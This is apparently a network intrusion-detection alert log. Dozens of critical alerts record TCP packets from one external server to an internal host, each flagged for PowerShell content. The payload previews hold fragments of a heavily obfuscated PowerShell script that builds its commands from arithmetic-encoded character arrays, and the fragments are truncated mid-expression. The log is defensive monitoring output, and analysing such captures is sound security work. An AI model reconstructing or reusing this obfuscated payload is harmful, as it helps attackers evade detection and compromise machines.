Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
77+6888),(617880/(29625720/(7062072/(4011-2719)))),(-3833+(452+(-2565+(9551820/1588)))),(7392-7295),(-2998+3097),(-7485+7589),(288405/(908+5501)),(257856/(11348928/(10413615/2995))),(-9642+9740),(391988/3698),(195536/(11778624/(1858+4226))),(461142/4658),(-2838+2954)) -join '');& (([char[]]@((744510/6474),(6508-(1211+5196)),(441032/3802),(293715/(549+5978)),(8605-(15110-6602)),(-6039+(37674963/(-3368+(50770962/(10160-(44380266/9219)))))),(5599-(22327616/4064)),(4021-(9148-(14021216/2684))),(6676
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.966867
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
1797+(36257688/(-2221+(9885-3012))))),(413192/(-3594+(4708+(1111+1337)))),(-6121+(25397754/(-4785+8904))),(-7195+7292),(827928/7666),(-3582+3687),(929260/(63189680/6596)),(-9099+9214))))) ameouyzrfblw ([char[]]@((5701-5596),(334510/(-5725+8766)),(730066/6187),(-1875+(-708+2694)),(6263-6156),(1884-1783),(1464-(-6068+7487)),(1824-(8433-(12192070/(478+(-8487+9826))))),(669960/5583),(352352/3146),(-7041+(12140-4985)),(3504-(10066-6663)),(897920/(-453+(9946-1685))),(8633-(2251+(63133758/10074))),(868
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.968623
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(6254-(38576512/(8029-1815))),(4368-(8008462/(-5621+(660+(4232+(12136244/4684)))))),(-8323+8434),(886824/8136),(3797-(12982255/(7866-4343))),(-6051+(15991-9826)),(700334/(5153+(12531116/(67257124/9559)))),(8113-(14246-(11415096/(7572915/4145)))),(-6730+(437+6408)),(5438-(-1148+6481)),(416583/(-1822+(10261-(2062+(22091456/(17255-8836)))))),(484220/(17374694/(-3502+7449))))));wezonhs -AssemblyName $global:mdtgwnxlu.([char[]]@((-3919+4024),(9930-9820),(3848-3730),(10240-10129),(2131-2024),(1845-174
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.970068
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
065+3097),(356070/(-855+(1361+3784))),(-5483+(10074-4470)),(1156095/10053),(-3995+(12547-(-1790+(15211-(13215-8230))))),(5091-4990),(6907-6798),(164610/2790),(96564/7428),(-8422+(65702144/(9816-(14963432/(46716367/6319))))),(-9795+9912),(7908-7793),(-5403+(9549-(-3626+7667))),(-4169+4279),(1044729/10143),(123936/(5821119/1503)),(653044/(10877-(-947+(6216-(-250+(4966-(-5915+8371))))))),(-5912+6033),(365240/3176),(869884/(66756098/8902)),(-8295+(716+7680)),(-3680+(9687-(-2384+(12166-(10072-6188)))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.971469
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
94)),(-2780+2878),(-7693+(3372+(-1336+(2760+(7234-4238))))),(2278-(19198725/(800+(10316-(5712-(42+(23504712/(29754560/(6895080/(8965215/(10962-(11402-6005)))))))))))),(456700/(9019825/1975)),(423168/(-4583+8231)),(9111-8998),(-7671+7785),(1229-1111),(89888/(12753-(78010680/(15190-(17017-9672))))),(169617/1379),(1830-1817),(-4832+4842),(-1576+(2709480/(-87+1772))),(295008/9219),(4104-3992),(145548/1244),(1506-1408),(579204/(16303520/3040)),(146895/(8252701/5899)),(3647-(-2435+(26067931/4357))),(6
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.973344
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
3568-(1445+(2518280/(12823760/10210)))),(-6116+(13079-(-994+(13273-(46438127/(37292913/4347)))))),(2003-(14588397/7731)),(-9559+9660),(-3130+(-6171+9333)),(-7084+7199),(901668/(-914+(17720-(10356-1323)))),(921306/(93659778/(11534-(10160-(82807659/9757))))),(3923-3807),(-2929+(22136064/7296)),(6854-(9334-(17230299/6681))),(8641-8609),(9685-(12343-2741)),(9581-9460),(339825/2955),(7148-(5607+(-1979+3404))),(6189-6088),(-3269+(-6169+9547)),(5404-(9240-3882)),(596640/(33710160/(-1983+5712))),(2521-2
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.974879
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(6259-(4672+(-5540+(-1147+(9795-1631))))),(548200/5482),(331381/(8878-(4106+1491))),(8310-(83853276/10231)),(5975-5931),(1192-1179),(96530/(16053-6400)),(9115-(1967+(13625-6509))),(4227-(22212525/5295)),(4558-4526),(141984/(6104-(11422284/(8917-(20170920/9768))))),(4177-4094),(2154-2033),(3905-(13270-(46831200/(11505-6565)))),(2657-(-3991+6532)),(8962-8861),(-8791+8900),(-6336+6382),(9569-(-176+(60136288/6224))),(548632/5432),(5032-4933),(-2034+2151),(4000-(17424824/4484)),(9028-(12703-(11054-72
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.976270
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
8905),(499887/7461),(7196-(16529-9434)),(344622/3023),(-8411+8527),(7671-(323+(1070+6173))),(-8589+8691),(4597-(42741380/(14340-(9439-(7677696/(-1354+3018)))))),(655380/6620),(975432/10056),(10347-(18745-8514)),(441471/4371),(304544/9517),(928224/9376),(-2598+(26425909/(1752+8039))),(1152084/(14623-4517)),(-3207+(21709159/6533)),(-3005+(9378-6268)),(-8174+8276),(597660/5692),(-3750+3849),(8618-(20007308/2348)),(-9600+(3562+6154)),(-3368+3469),(8652-8608),(3997-(22111200/5550)),(3372-3362),(6068-
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.977684
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
+1402))))),(-2097+2145),(-7780+7837),(161470/(16530190/6859)),(1018585/10085),(-9424+(14350-(2680+2132))),(714676/(2467+(-1660+5354))),(370125/3525),(698496/(3602+(29772312/(51243964/(9043-3456))))),(-2744+(16079756/5644)),(415008/4192),(4387-4290),(2794-(25936430/9685)),(-2905+3006),(-5808+5923),(206678/(10816-6323)),(7926-(68+7770)),(218731/4127),(170304/(12059652/(29197410/(10864-(10460-(75474920/(6019+3201))))))),(162222/(-6570+(47230656/(13723-8707)))),(95341/1423),(1610-1506),(121735/(9883
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.979594
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
494/8897)),(4641-4561),(8929-(1119+7699)),(463104/4288),(-2051+2156),(913869/(25265247/(12603885/4605))),(-2772+2893),(135792/(-4886+(11981-5127))),(9970-9856),(-8961+(22859925/2519)),(828615/(46581600/(897+5343))),(650370/5705),(9923-9808),(309280/(86366440/(15064-6128))),(9456-(35486459/(10057-(14303-8045)))),(-10074+(389+(167+9633))),(7462-(9693-2339)),(-5740+5820),(9354-9243),(-5173+(559+(865+(-2292+(14171-(16538-(66833568/7848))))))),(796635/7587),(3878-3779),(1228755/10155),(6739-6670),(19
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.980920
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 848 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
1052990/1206)),(-6722+(8261-(5350-3927))),(841918/(13733-6775)),(4431-4385),(5049-(19589224/(-5608+(68726160/7204)))),(1610-1496),(1477-1356),(-7486+7598),(-6294+(16524980/(5622-3044))),(-9098+9209),(1250-1147),(270636/(7950526/3349)),(-3582+3679),(7205-7093),(3114-3010),(381392/(12286-9134)),(7899-(64418159/8203)),(8231-8143),(172939/3263),(6969-(11006-4085)),(437589/7677),(7403-(17141-9805)),(2160-2059),(614004/5386),(-4091+4207),(2531-2426),(-4589+(-1922+(-564+7177))),(-7540+(15545-7900)),(92
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.982457
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
2000
71),(248805/(9534105/(13452-9735))),(-9749+9865),(5789-5688),(294350/5887),(332080/(3213+(1505+3584))),(3618-(31213005/(66513110/7486))),(904475/7475),(5746-(20361276/3614)),(-9911+(13333-3315)),(4185-4076),(1105299/9447),(9410-9290),(393984/(-1537+5185)),(-7188+(63631039/8713)),(-1150+1251),(286062/2919),(-3362+3403),(313526/(9322-4008)),(8096-8083),(7500-7490),(220800/6900),(4211-4179),(82496/2578),(326560/(180+(29593800/(-3816+6768)))),(267328/(63172948/7562)),(221502/1943),(506818/(317
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.983939
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
0044),(46740/4674),(4947-4915),(108771/(12459-(31258788/(4862+2777)))),(-3244+(21938468/(2716+4026))),(47168/(3424-(11290-(71908660/7699)))),(267392/8356),(-6092+6204),(-6272+6389),(7078-(22007940/(10617-(13935288/1867)))),(7568-(15572-(4495+(2050+1567)))),(470925/(6212-(-4851+(3952+2626)))),(-8310+(43684755/5195)),(81312/2541),(5641-5526),(7958-(15480108/(10361526/(-2634+(28181725/3575))))),(5784-5687),(-8079+(40458715/(-1156+(11686374/1918)))),(1040130/9906),(668052/6748),(211232/6601),(6398-(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.985620
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
2/9452))))),(-1622+(5303-(19780096/5519))),(-10091+(8533+1666)),(1044750/(60764650/(2377+(9239-5509)))),(479700/4797),(-4330+4427),(-8627+8743),(6791-6686),(-4950+5061),(-7562+(39932760/(-3051+(51121152/(8863-(9332-(2208+(-2856+7309)))))))),(318585/(-5082+9837)),(228920/(-2521+(-3964+8845))),(-9809+9917),(593892/(9667-(166+4002))),(3883-3785),(594028/(1797+4327)),(873873/8827),(985363/9209),(97216/3038),(-8157+(81774000/(17192-(-832+8124)))),(3482-3381),(-3927+(11479-7436)),(396396/4004),(6101-6
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.987125
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
6),(8694-8578),(6550-(63954733/9917)),(9173-9064),(9459-(12572-3159)),(208884/(-3030+5708)),(594284/5884),(5958-(30325822/5191)),(-8628+8674),(3916-3833),(820625/(71435000/(13194-4402))),(912780/9220),(-2565+2682),(5382-(-4500+(18491-8723))),(5444-(52119318/(59226054/(12018-(2836+3115))))),(8169-(60566613/7521)),(3007-2886),(-5094+5140),(-5705+(42007833/7259)),(346531/(11931-(86164500/(13272-3135)))),(5750-(52799760/9360)),(8188-(32170691/3983)),(-9227+9343),(330573/3273),(-2947+(-4994+8008)),(9
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.988726
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
6631/(21489666/6086)),(-7261+7359),(263200/8225),(-8250+8311),(-9100+9167),(672216/6056),(5092-4982),(1050554/8903),(5146-(-3553+8598)),(-8932+(7274+(6609-4837))),(-6271+6387),(-5650+(-1713+7409)),(305620/4366),(-3044+3158),(10100-9989),(5833-(50388372/(17573-8770))),(145596/(-1504+3710)),(-7461+7558),(2162-(4127-(6131-(15657115/(10031-(15743-9577)))))),(-1256+(6718-(1408+(10221-6268)))),(-9218+9272),(413868/(9436-1477)),(195631/2357),(5776-(2439+3221)),(963984/8456),(1333-(2242328/1826)),(65560
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.990439
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
192))))),(-6114+(26581555/(15042209/3517))),(-7923+8022),(-3768+3885),(3569-(17554855/5081)),(-9253+9358),(-3457+3573),(-3536+(5463-(-695+(-7401+(7538+2364))))),(8808-8762),(-6583+6665),(-3717+3818),(8031-7922),(-3194+3305),(912340/(3281+(35319720/(11317-(-4458+(2768+5302)))))),(3070-(-4382+(10847-(12751-(5432+3823))))),(8897-(11883-3053)),(128169/(6887-(1836+3782))),(-1931+(19742430/(-350+10004))),(384656/(4032256/(-488+(8988600/(3416+1859))))),(-7558+7663),(252042/2471),(839055/7991),(4713-(-3
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.992225
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
1+(65928339/6827))),(1195576/10132),(335911/(11541-8078)),(382860/(27892060/7868)),(150780/1436),(9974-9874),(-4261+4358),(176552/(7009-(51961890/(16296-(14403-(5229+2348)))))),(-4706+4811),(384060/(22981320/6642)),(-2717+(11084667/3921)),(-1538+1551),(-2070+(4784-(3498976/(-8677+(12650-2679))))),(315840/9870),(62368/1949),(-9285+(7602+(5721240/3336))),(4177-4145),(-8133+8174),(-7099+7158),(5747-5734),(7938-(-1717+(8540+1105))),(7961-(63416142/(4678+3320))),(-5282+(10495-5200)),(8555-(-869+(7033
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.994685
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
4+(7972-(-1300+(13453748/(13500-(16600-(11866-4795))))))),(3330-(1368+1930)),(6048-(-3125+9074)),(863352/(79012696/9884)),(152290/(-6598+(50902976/6232))),(-5981+6096),(2440-2325),(255232/(13233-5257)),(519652/(21732312/(-967+3769))),(6051-(7061-1107)),(408456/3782),(-6531+6639),(511462/5219),(5152-(13433-8378)),(-8736+(11008-(-7853+(20262546/(-2292+(-2903+7216)))))),(430889/(20183324/5012)),(694899/10071),(3181-(-818+3881)),(377235/3735),(-1112+(4912-(-1537+(44481770/8510)))),(-7354+7470),(8498
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.996366
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
),(-9874+(49117025/4925)),(6993-6886),(86784/(4459-(9059942/(-2717+(14668-(43600425/6445)))))),(485080/(5434+1806)),(9392-9295),(943056/(26519084/3037)),(-5032+(-4942+(70967198/7039))),(271852/2774),(8565-(18510-10042)),(323334/(-6380+9646)),(916990/(4593+3977)),(1746-(-1032+2711)),(1027194/9254),(5036-4927),(-2783+(6501-3606)),(1032912/(10808-(4435-3191))),(660641/6541),(1229-1113),(-8630+(3011+(9289280/(-8367+9991)))),(-1714+1746),(-4458+(27922901/(-419+(33794956/5122)))),(4020-3988),(445100/(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:07.998537
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
8/5574),(5559-5462),(-5344+(12574-(53813832/(-2377+(54373242/5474))))),(-7543+(10894-(10685-7442))),(8705-(16740615/1945)),(4257-4160),(204831/(860+1209)),(1000664/9352),(226368/7074),(-2357+2441),(983220/9364),(-10083+(6976+(27181632/(13022-(10253-(-1859+(19865628/2634))))))),(997274/(16422-6548)),(8134-8020),(8566-8499),(-3216+(341+2972)),(5071-(79+4884)),(1081620/10015),(-2370+2468),(-1842+(-58+(-2311+(5965-1657)))),(187110/(-4611+6501)),(-9425+9532),(206561/3083),(127206/(-1463+2609)),(-4294
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.000313
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
11026925/2275)),(649944/(13131-7113)),(384258/3921),(4895-4798),(818730/(66532150/(33893585/(14791843/3511)))),(-6851+6958),(9029-8960),(-6808+6926),(-9548+9649),(4336-4226),(8008-(5915+1977)),(-9152+(19336-(143+9975))),(7341-(36872154/(14604-(27489286/(-2556+5449))))),(-4119+4224),(424600/(13465-9219)),(417871/(10885-6828)),(-2699+(8741-(60015982/(73461744/(15143-(1150+6721)))))),(371600/9290),(4894-4853),(207520/(10763-4278)),(-3225+(-1310+(12177-7519))),(63456/(9101970/4590)),(8975-(24063150/
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.002321
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
8388725/(44876700/(-1622+7666))))),(-3033+(9686-(12769-(2796+(-1552+4987))))),(629926/5206),(8641-8531),(424116/(16818984/3926)),(646980/(54377880/(55439248/8044))),(-7258+7359),(9367-9252),(455832/(17672256/(7624-(12907840/(6642020/1589))))),(627156/(2343+3464)),(-4998+5114),(3766-(31802478/(12140-3623))),(1147638/(14828-(3164+(6460-4863)))),(-4092+(11761-(14963-(12115-4720)))),(-3850+(-2604+(9043-2474))),(-6574+(-1098+7789)),(379944/(6673646/1897)),(-3382+(12204522/3489)),(7152-(10876-(6761-(4
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.004449
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
40/(11303-(8970325/(21571550/9482)))),(-2915+(28867152/(4316+5543))),(6081-6071),(-8023+8055),(2473-2441),(242144/7567),(-2191+(-4671+6894)),(4502-4377),(44616/(12298-8866)),(-6286+(13947-7651)),(-4847+4860),(24900/(4193160/1684)),(9623-(57488454/(-852+6846))),(8568-8536),(2992-(-1717+(37691943/(13819-(8436-(691+1985)))))),(143168/(40807354/(15235-6114))),(-9151+(16354-(-462+7553))),(2862-2748),(10064-(11340-(-4039+5420))),(1362-(10589-(1560+(40069395/5147)))),(-5678+5775),(4686-(25962170/(31631
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.006452
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
3))),(-5422+5538),(944754/(11579-(9109-(8467320/1230)))),(301965/(4506+2859)),(-9902+(996+(17367-(16423-(265+(23338170/(-6147+9174))))))),(66910/6691),(1246-1214),(154016/4813),(195072/(7930-1834)),(1349-1317),(276381/2247),(100126/7702),(2663-2653),(-2430+2462),(1787-1755),(-3830+(20727354/(14057-8690))),(2065-(6757692/(7896-(32900112/(2554+(1980+(13110350/(29185550/(47716152/8052))))))))),(-7923+(14511-(12710-6154))),(-10103+10135),(313536/9798),(107712/(-2834+6200)),(756672/(15180-(14848-(671
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.008264
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
)),(61980/(13221-7023)),(-7792+7824),(124864/(-590+4492)),(-2739+(5237-2466)),(-3653+(7405-(2133+(9852-(79220025/9585))))),(-1399+1511),(5442-(3178+2147)),(182672/1864),(2980-2872),(917910/(-998+(5356+(10390080/(11919-(63730026/6674)))))),(282348/2852),(-3403+3435),(522015/8031),(-9308+9423),(-5997+6118),(2072-(2921418/1489)),(-2282+(386+1995)),(-9886+9953),(424181/4373),(1884-(11034288/6213)),(-6857+(44687440/6416)),(2261-(5618-(6007-(14862848/5824)))),(761353/(55327601/(63377559/(16728-7737)))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.011338
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
7),(808353/(958+5951)),(2269-(3393-1238)),(513920/4672),(287040/(79411410/8853)),(6786-(4370+(4005-(-8483+(11444568/1124))))),(3539-(-2438+(1014+4862))),(1083971/(80742176/8864)),(2128-2096),(289120/4448),(-8004+8119),(-5596+5717),(5216-5106),(941292/(10515848/1106)),(-10071+(4056+6082)),(6741-(11901-5257)),(288144/(5106-2438)),(-5119+5227),(6179-(6889773/(1699500/1500))),(-3537+3634),(2316-2217),(338227/3161),(181680/(8569-(19534977/4851))),(-2788+2855),(-6995+7092),(9506-9398),(-2105+2213),(-3
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.013809
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
))),(-9817+(68932042/6953)),(6917-(52177367/7663)),(-1479+(-5704+7291)),(-2098+2196),(-4190+4287),(3189-3090),(-9128+(15145400/1640)),(3285-3253),(9733-9649),(-9411+9516),(4768-4659),(-8446+8547),(5237-5123),(-1040+1107),(5658-5561),(-5159+5267),(8712-8604),(6330-(42184408/(16217-9448))),(2491-2394),(391644/(8109800/(10034-7984))),(-5002+5109),(-2510+2523),(23990/2399),(-7479+(2375+5136)),(-7474+7506),(269280/8415),(7305-7273),(-1122+1245),(-6735+6748),(4378-4368),(-3174+(13843508/(9898-(-2395+7
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.016384
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
84/1372),(289332/(9562-(9053-2170))),(-2039+(11591653/5399)),(-8524+(10941318/1269)),(709749/7317),(6147-6048),(545593/5099),(2320-(-6657+8904)),(-2597+2707),(492072/4242),(412888/4088),(385320/3380),(-3815+3925),(3742-3645),(7803-7695),(-9500+9541),(120360/2040),(-5497+(14726-9197)),(4508-(12872-8489)),(86476/(-1340+(1016+6976))),(8862-(79234252/8951)),(6170-6138),(4624-4592),(7856-7824),(-5681+5713),(-8687+8812),(3493-3480),(4284-(34333042/8033)),(-8527+8540),(76440/7644),(127456/3983),(-4748+
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.018143
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
126+2061)),(-9595+(3463+6233)),(51872/(6757-(52089312/(76906786/(6382+(-1855+(18284048/(47349462/7914)))))))),(137283/(4019-1970)),(4202-(13116-9028)),(-7307+7408),(152775/1575),(1138076/9811),(-4067+4168),(9215-(3161+(48262350/8025))),(-8524+(12265-3700)),(5517-5504),(-4707+(-5271+(1851+(12240-(-4598+(44723140/(41762500/8125))))))),(-4222+4254),(9653-9621),(-7358+7390),(-9415+(94309401/(7038+2945))),(146370/1190),(-7099+7112),(-2793+(17998063/6421)),(-9604+(78465948/8143)),(251200/7850),(-5400+
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.019454
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
1-(1305+(7156-4946))),(4753-4687),(-3286+(-3248+6648)),(-2250+2355),(-3206+(10629-7323)),(10335-10232),(745582/7382),(-9394+9434),(318816/7776),(8795-8736),(52507/(-4258+(78215819/(43345346/4598)))),(63790/(9527-(12251-9103))),(-2214+(10010422/(2938+(8528-(3470+3539))))),(187584/(48935976/(12889312/(-4259+5803)))),(10161-10129),(7877-(15429-(36152928/(11994-(1947+5280))))),(511875/4095),(29861/(-5036+7333)),(-6861+(14047-7176)),(-2910+(6338-3303)))| hdtszcjq { [char]$_ }));eijaqurzhbdpl $qonfbjl
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.021492
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
59+(19158-9003)))),(565802/(9125-(32630026/(16244-(20275728/(17261376/5944)))))),(914736/8024),(933334/(12894-(-3778+(12141-5091)))),(-2578+2694),(8175-8064),(6838-(46409048/(4510+(3829-1437)))),(-8053+8168)) -join ''))::Add(([char[]]@((-4251+(37209752/8552)),(748160/6680),(-2839+2948),(397224/(-870+4548)),(-8979+9095),(4433-(31142640/(64145936/(75583985/(2705+5760))))),(747870/7710)) -join ''), [type]([char[]]@((-6816+6899),(-7822+7943),(-8802+8917),(1113948/9603),(6972-(13175-(11575-(2420+(-68
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.023874
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
4405-4359),(-7758+7842),(-8728+8849),(2608-(7579-5083)),(8942-8841),(558805/8597),(-5780+(2106+(9811-(13414-7376)))),(-3301+3400),(5276-(-3309+8484)),(576072/5334),(-9718+(11860-(8268-(13900-(1046+(8585-1958)))))),(2828-(-306+(-3880+6900))),(6974-6877),(933336/8046),(-5900+6011),(580830/5095),(-9531+9646)))))::Add((-join (@((-4093+4209),(729400/7294),(394335/(34084260/9940)),(6679-6578),(770340/(15309640/(9952-(12873852/1662)))),(-6841+6951),(908972/(6298+(5050-(-147+3451)))),(-5003+(2796+(19650
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.026308
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
